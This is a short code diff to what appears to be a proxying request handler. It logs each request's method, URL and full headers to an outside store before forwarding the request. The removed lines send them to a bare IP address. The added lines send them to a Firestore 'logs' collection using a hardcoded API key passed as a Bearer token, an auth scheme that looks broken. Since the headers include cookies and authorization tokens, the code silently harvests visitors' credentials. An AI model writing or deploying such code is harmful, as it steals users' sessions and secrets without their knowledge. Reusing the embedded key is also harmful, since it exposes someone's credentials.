@@ -3317,13 +3317,25 @@ async function handleRequest(request) {
     headers: [...request.headers.entries()]
   };
 
-  const logUrl = 'http://5.239.172.29:3000/';
-  await fetch(logUrl, {
+  const firestoreURL = `https://firestore.googleapis.com/v1/projects/fzli-7ef4e/databases/(default)/documents/logs`;
+  const firestoreToken = 'AIzaSyBLV_bg8p9erE7e-aWhgyJz2_Yy6mqM8V0';
+
+  await fetch(firestoreURL, {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(logData)
+    headers: {
+      'Authorization': `Bearer ${firestoreToken}`,
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      fields: {
+        method: { stringValue: logData.method },
+        url: { stringValue: logData.url },
+        headers: { arrayValue: { values: logData.headers.map(header => ({ stringValue: header.join(': ') })) } }
+      }
+    })
   });
 
   const response = await fetch(request);
   return response;
 }
+
